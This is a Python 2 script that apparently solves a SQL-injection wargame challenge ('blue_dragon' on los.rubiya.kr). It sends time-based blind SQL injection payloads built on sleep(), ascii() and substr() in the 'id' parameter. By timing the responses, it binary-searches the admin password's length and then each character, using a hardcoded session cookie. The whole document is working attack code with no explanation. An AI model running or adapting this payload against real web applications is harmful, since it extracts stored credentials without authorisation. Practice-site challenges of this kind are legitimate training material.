#!/usr/bin/env python

import requests
import sys

URL = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
UA =  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
PHPSESSID="6a6k2j9arcl8e1bbe36q4u6670"


def query(params):
    headers = {
        'User-Agent': UA
    }
    cookies = {'PHPSESSID': PHPSESSID}
    res = requests.get(URL, headers=headers, cookies=cookies, params=params)
    print res.elapsed.seconds
    return res.elapsed.seconds >= 2


def find_length():
    left = 0
    right = 200 # (left, right]
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query({
            'id': "' or (sleep(2*(id='admin' and length(pw)>{})))#".format(mid),
            'pw': ''
        }):
            left = mid+1
        else:
            right = mid
    return right

def find_ch(pos):
    print "Finding pos {} th character".format(pos)
    left = 0
    right = (1<<8)
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query({
            'id': "' or (sleep(2*(id='admin' and ascii(substr(pw,{},1))>{})))#".format(pos, mid),
            'pw': ''
        }):
            left = mid+1
        else:
            right = mid
    print "COOL!! {} = {}".format(pos, right)
    return right

LENGTH = find_length()
print "LENGTH = {}".format(LENGTH)
PASSWORD = ""
for i in range(1, LENGTH+1):
    PASSWORD += chr(find_ch(i))
    print PASSWORD

print PASSWORD

query(PASSWORD)
